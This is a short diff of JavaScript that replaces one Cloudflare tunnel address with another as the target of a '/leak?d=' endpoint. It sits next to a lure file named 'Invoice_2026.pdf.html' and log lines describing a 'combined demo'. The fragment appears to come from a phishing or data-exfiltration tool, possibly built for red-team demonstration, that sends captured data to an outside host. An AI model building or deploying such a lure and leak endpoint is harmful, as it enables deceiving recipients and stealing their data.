@@ -17,7 +17,7 @@
      browser window, or leave null for auto (screen.availHeight - 120).
      Try ~650-750 on a MacBook if auto is too tall. */
   var TARGET_PX = 1455;
-  var R = "https://uniform-var-laura-cpu.trycloudflare.com/leak?d=";
+  var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
   var FNAME = "Invoice_2026.pdf.html";
   function log(m) { try { console.log("[T71b] " + m + " @" + Date.now()); } catch (e) {} }
   log("START polished combined demo, epoch " + EPOCH);
